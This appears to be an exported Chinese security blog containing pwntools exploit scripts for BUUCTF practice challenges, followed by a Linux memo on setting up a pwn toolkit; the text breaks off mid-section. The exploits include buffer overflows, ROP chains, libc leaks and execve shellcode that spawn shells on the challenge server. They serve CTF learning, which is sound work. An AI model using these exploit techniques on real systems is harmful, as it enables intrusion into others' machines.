class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.9\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25351</span>)</span><br><span class=\"line\">win1 = <span class=\"number\">0x080485CB</span></span><br><span class=\"line\">win2 = <span class=\"number\">0x080485D8</span></span><br><span class=\"line\">flag = <span class=\"number\">0x0804862B</span></span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x18</span>+<span class=\"number\">0x4</span>)+p32(win1)+p32(win2)+p32(flag)+<span class=\"string\">b\"\\xAD\\xAA\\xAA\\xBA\"</span>+<span class=\"string\">b\"\\xAD\\xBA\\xAD\\xDE\"</span></span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-test-your-memory\"><a href=\"#jarvisoj-test-your-memory\" class=\"headerlink\" title=\"jarvisoj_test_your_memory\"></a>jarvisoj_test_your_memory</h2><blockquote>\n<p>不知道是什么问题，只有交互输出才可以</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.11\")</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.232.so\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28866</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.12\"</span>)</span><br><span class=\"line\">cat = <span class=\"number\">0x080487E0</span></span><br><span class=\"line\">sys = <span class=\"number\">0x08048440</span></span><br><span class=\"line\">sys_addr=elf.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*<span class=\"number\">0x17</span>+p32(sys)+p32(<span class=\"number\">0x8048677</span>)+p32(cat)</span><br><span class=\"line\">print(pld)</span><br><span class=\"line\">s(pld)</span><br><span class=\"line\">ru(<span class=\"string\">\"&gt;\"</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-router\"><a href=\"#bjdctf-2020-router\" class=\"headerlink\" title=\"bjdctf_2020_router\"></a>bjdctf_2020_router</h2><p>命令执行</p>\n<h2 id=\"picoctf-2018-buffer-overflow-1\"><a href=\"#picoctf-2018-buffer-overflow-1\" class=\"headerlink\" title=\"picoctf_2018_buffer overflow 1\"></a>picoctf_2018_buffer overflow 1</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29603</span>)</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span></span><br><span class=\"line\">pld = shellcode.ljust(<span class=\"number\">0x28</span>+<span class=\"number\">4</span>,<span class=\"string\">'A'</span>)+p32(<span class=\"number\">0x080485CB</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ZJCTF-2019-Login\"><a href=\"#ZJCTF-2019-Login\" class=\"headerlink\" title=\"[ZJCTF 2019]Login\"></a>[ZJCTF 2019]Login</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.18\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25296</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Please enter username: \"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">\"admin\"</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Please enter password: \"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">b'2jctf_pa5sw0rd'</span>.ljust(<span class=\"number\">0x48</span>, <span class=\"string\">b'\\x00'</span>) + p64(<span class=\"number\">0x400e88</span>))</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"cmcc-simplerop\"><a href=\"#cmcc-simplerop\" class=\"headerlink\" title=\"cmcc_simplerop\"></a>cmcc_simplerop</h2><p>1.写入bss段，32位系统调用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.19\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26841</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.19\"</span>)</span><br><span class=\"line\">int = <span class=\"number\">0x080493e1</span></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x080bae06</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x080481c9</span></span><br><span class=\"line\">pop_ecx_ebx = <span class=\"number\">0x0806e851</span></span><br><span class=\"line\">pop_edx = <span class=\"number\">0x0806e82a</span></span><br><span class=\"line\">pop_edx_ecx_ebx = <span class=\"number\">0x0806e850</span></span><br><span class=\"line\">read = elf.sym[<span class=\"string\">\"read\"</span>]</span><br><span class=\"line\">bss = elf.bss()</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>)+p32(read)+p32(pop_edx_ecx_ebx)+p32(<span class=\"number\">0</span>)+p32(bss)+p32(<span class=\"number\">8</span>)</span><br><span class=\"line\">pld += p32(pop_eax)+p32(<span class=\"number\">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class=\"number\">0</span>)+p32(<span class=\"number\">0</span>)+p32(bss)+p32(int)</span><br><span class=\"line\">ru(<span class=\"string\">\"Your input :\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">s(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<p>2.改mprotect权限</p>\n<blockquote>\n<p><strong>mprotect()</strong>函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</p>\n<p>一般用于在利用shellcode方式进行栈溢出时，但是bss段没有足够的权限来写入shellcode时，可以利于mprotect函数来改写bss段的权限</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29587</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.19\"</span>)</span><br><span class=\"line\">int = <span class=\"number\">0x080493e1</span></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x080bae06</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x080481c9</span></span><br><span class=\"line\">pop_ecx_ebx = <span class=\"number\">0x0806e851</span></span><br><span class=\"line\">mprotect = elf.sym[<span class=\"string\">\"mprotect\"</span>]</span><br><span class=\"line\">pop_edx_ecx_ebx = <span class=\"number\">0x0806e850</span></span><br><span class=\"line\">read = elf.sym[<span class=\"string\">\"read\"</span>]</span><br><span class=\"line\">bss = elf.bss()</span><br><span class=\"line\">print(hex(bss))</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>)+p32(mprotect)+p32(pop_edx_ecx_ebx)+p32(<span class=\"number\">0x80ea000</span>)+p32(<span class=\"number\">0x2000</span>)+p32(<span class=\"number\">7</span>)</span><br><span class=\"line\">pld += p32(read)+p32(bss+<span class=\"number\">0x50</span>)+p32(<span class=\"number\">0</span>)+p32(bss+<span class=\"number\">0x50</span>)+p32(<span class=\"number\">0x50</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Your input :\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">s(<span class=\"string\">\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level1\"><a href=\"#jarvisoj-level1\" class=\"headerlink\" title=\"jarvisoj_level1\"></a>jarvisoj_level1</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27709</span>)</span><br><span class=\"line\">write_plt=elf.plt[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">write_got=elf.got[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">main_addr=elf.symbols[<span class=\"string\">'main'</span>]</span><br><span class=\"line\">pld1=<span class=\"string\">'A'</span>*<span class=\"number\">140</span>+p32(write_plt)+p32(main_addr)+p32(<span class=\"number\">1</span>)+p32(write_got)+p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">sl(pld1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = uu32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">'write'</span>,write_addr)</span><br><span class=\"line\">libcbase=write_addr-libc.dump(<span class=\"string\">\"write\"</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">binsh=libcbase+libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libcbase)</span><br><span class=\"line\">pld=<span class=\"string\">'A'</span>*<span class=\"number\">140</span>+p32(system)+p32(<span class=\"number\">0</span>)+p32(binsh)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"pwnable-orw\"><a href=\"#pwnable-orw\" class=\"headerlink\" title=\"pwnable_orw\"></a>pwnable_orw</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26963)</span><br><span class=\"line\">shellcode&#x3D;asm(&#39;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#39;)</span><br><span class=\"line\">shellcode+&#x3D;asm(&#39;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#39;)</span><br><span class=\"line\">shellcode+&#x3D;asm(&#39;mov eax,0x4;mov ebx,0x1;int 0x80&#39;)</span><br><span class=\"line\">sl(shellcode)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"wustctf2020-getshell\"><a href=\"#wustctf2020-getshell\" class=\"headerlink\" title=\"wustctf2020_getshell\"></a>wustctf2020_getshell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29511)</span><br><span class=\"line\">pld &#x3D; b&#39;A&#39;*(0x18+0x4)+p32(0x0804851B)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"picoctf-2018-buffer-overflow-2\"><a href=\"#picoctf-2018-buffer-overflow-2\" class=\"headerlink\" title=\"picoctf_2018_buffer overflow 2\"></a>picoctf_2018_buffer overflow 2</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27988)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn3.24&quot;)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn3.23&quot;,env &#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc-2.232.so&quot;&#125;)</span><br><span class=\"line\">pld &#x3D; b&#39;A&#39;*(0x6c+0x4)+p32(0x080485CB)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"Linux备忘录","url":"https://pz1o.top/2021/01/23/linux备忘录/","content":"<p>主要记录一些基础的linux知识</p>\n<h1 id=\"0x01-安装PWN环境\"><a href=\"#0x01-安装PWN环境\" class=\"headerlink\" title=\"0x01 安装PWN环境\"></a>0x01 安装PWN环境</h1><p>这里主要记录一下从0开始安装pwn环境</p>\n<h2 id=\"1-vmtools\"><a href=\"#1-vmtools\" class=\"headerlink\" title=\"1.vmtools\"></a>1.vmtools</h2><p>先挂载上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar zxpf VMwareTools-x.x.x-yyyy.tar.gz</span><br><span class=\"line\">cd vmware-tools-distrib</span><br><span class=\"line\">sudo .&#x2F;vmware-install.pl</span><br></pre></td></tr></table></figure>\n<p>安装先输YES</p>\n<p>之后直接回车</p>\n<h2 id=\"2-安装git\"><a href=\"#2-安装git\" class=\"headerlink\" title=\"2.安装git\"></a>2.安装git</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install git</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-安装pip\"><a href=\"#3-安装pip\" class=\"headerlink\" title=\"3.安装pip\"></a>3.安装pip</h2><p>pip2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install python-pip</span><br></pre></td></tr></table></figure>\n<p>pip3</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install python3-pip</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-安装vim\"><a href=\"#4-安装vim\" class=\"headerlink\" title=\"4.安装vim\"></a>4.安装vim</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get remove vim-common</span><br><span class=\"line\">sudo apt-get install vim</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-安装pwntools\"><a href=\"#5-安装pwntools\" class=\"headerlink\" title=\"5.安装pwntools\"></a>5.安装pwntools</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pwntools</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-安装libcSearcher\"><a href=\"#6-安装libcSearcher\" class=\"headerlink\" title=\"6.安装libcSearcher\"></a>6.安装libcSearcher</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class=\"line\">cd LibcSearcher</span><br><span class=\"line\">sudo python setup.py install</span><br><span class=\"line\">把LibcSearcher.py放在exp相同目录下运行exp.py即可</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">先安装libc库</span><br><span class=\"line\">exp片段：</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">elf&#x3D;ELF(&#39;libc.xx.xx&#39;)</span><br><span class=\"line\">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class=\"line\">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class=\"line\">sys_addr &#x3D; offset + libc.dump(&#39;system&#39;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"7-安装One-gadget\"><a href=\"#7-安装One-gadget\" class=\"headerlink\" title=\"7.安装One_gadget\"></a>7.安装One_gadget</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install ruby</span><br><span class=\"line\">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>\n<h2 id=\"8-安装pwndbg\"><a href=\"#8-安装pwndbg\" class=\"headerlink\" title=\"8.安装pwndbg\"></a>8.安装pwndbg</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class=\"line\">cd pwndbg</span><br><span class=\"line\">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>\n<h2 id=\"9-安装ssh\"><a href=\"#9-安装ssh\" class=\"headerlink\" title=\"9.安装ssh\"></a>9.安装ssh</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install openssh-server</span><br><span class=\"line\">&#x2F;&#x2F;开启服务</span><br><span class=\"line\">sudo service ssh start</span><br></pre></td></tr></table></figure>\n<p><strong>配置文件/etc/ssh/sshd_config</strong></p>\n<h2 id=\"10-安装conda\"><a href=\"#10-安装conda\" class=\"headerlink\" title=\"10.安装conda\"></a>10.安装conda</h2><p>conda是一个开源的软件包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -c https:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.sh</span><br><span class=\"line\"></span><br><span class=\"line\">chmod 777 Miniconda3-latest-Linux-x86_64.sh</span><br><span class=\"line\">sh Miniconda3-latest-Linux-x86_64.sh</span><br><span class=\"line\"> </span><br><span class=\"line\">&#x2F;&#x2F;配置源</span><br><span class=\"line\">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;</span><br><span class=\"line\">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;</span><br><span class=\"line\">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;</span><br><span class=\"line\">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;</span><br><span class=\"line\">conda config --set show_channel_urls yes </span><br><span class=\"line\">conda config --get channels</span><br><span class=\"line\">&#x2F;&#x2F;删除配置源</span><br><span class=\"line\">conda config --remove-key channels</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;环境命令</span><br><span class=\"line\">conda env list</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;创建环境</span><br><span class=\"line\">conda create -n 3.6.7 python&#x3D;3.6.7</span><br><span class=\"line\">&#x2F;&#x2F;切换环境</span><br><span class=\"line\">conda activate</span><br><span class=\"line\">&#x2F;&#x2F;退出环境</span><br><span class=\"line\">conda deactivate</span><br><span class=\"line\">&#x2F;&#x2F;移除环境</span><br><span class=\"line\">conda remove -n env_name --all</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-一些命令\"><a href=\"#0x02-一些命令\" class=\"headerlink\" title=\"0x02 一些命令\"></a>0x02 一些命令</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">top 实时查看系统运行情况</span><br><span class=\"line\"></span><br><span class=\"line\">var&#x3D;value 给var赋值</span><br><span class=\"line\">$var,$&#123;var&#125;  取变量的值</span><br><span class=\"line\">&#96;cmd&#96; $(cmd) 代换标准输出</span><br><span class=\"line\">&#39;$var&#39;      非替换字符串  $var</span><br><span class=\"line\">&quot;$var&quot;\t\t\t可替换字符串\t1</span><br><span class=\"line\"></span><br><span class=\"line\">env  &#x2F;&#x2F;所有环境变量</span><br><span class=\"line\">LD_PRELOAD&#x3D;xx.so ldd a  &#x2F;&#x2F;优先加载动态链接库</span><br></pre></td></tr></table></figure>\n<h2 id=\"netstat\"><a href=\"#netstat\" class=\"headerlink\" title=\"netstat\"></a>netstat</h2><p>netstat是win中的一个命令，它用于查看本机端口状态。、</p>\n<p>常用参数有-a -n -b（显示连接程序）</p>\n<p><strong>linux中netstat</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat</span><br><span class=\"line\">-a : 将目前系统上所有的连接、监听、socket信息都列出来</span><br><span class=\"line\">-t ：列出tcp网络封包的信息</span><br><span class=\"line\">-u ：列出udp网络封包的信息</span><br><span class=\"line\">-n ：不以进程的服务名称，以端口号来显示</span><br><span class=\"line\">-l ：列出目前正在网络监听的服务</span><br><span class=\"line\">-p ：列出该网络服务的进程PID</span><br><span class=\"line\"></span><br><span class=\"line\">#常用的参数</span><br><span class=\"line\">netstat -anp | grep 端口号  &#x2F;&#x2F;筛选出端口号</span><br><span class=\"line\">netstat -aultp  &#x2F;&#x2F;查看哪些端口被占用</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/image-20200926113121287.png\" alt=\"image-20200926113121287\"></p>\n<h2 id=\"curl用法\"><a href=\"#curl用法\" class=\"headerlink\" title=\"curl用法\"></a>curl用法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#查看网页源码</span><br><span class=\"line\">curl www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#显示头信息</span><br><span class=\"line\">curl -i www.baidu.com\t &#x2F;&#x2F;头和页面一起显示</span><br><span class=\"line\">curl -I www.baidu.com  &#x2F;&#x2F;只显示头</span><br><span class=\"line\"></span><br><span class=\"line\">#显示通信过程</span><br><span class=\"line\">curl -v www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#发送表单信息</span><br><span class=\"line\">#get请求</span><br><span class=\"line\">curl http:&#x2F;&#x2F;httpbin.org&#x2F;get?id&#x3D;1</span><br><span class=\"line\">#post请求</span><br><span class=\"line\">curl -X POST --data &quot;name&#x3D;value&quot; 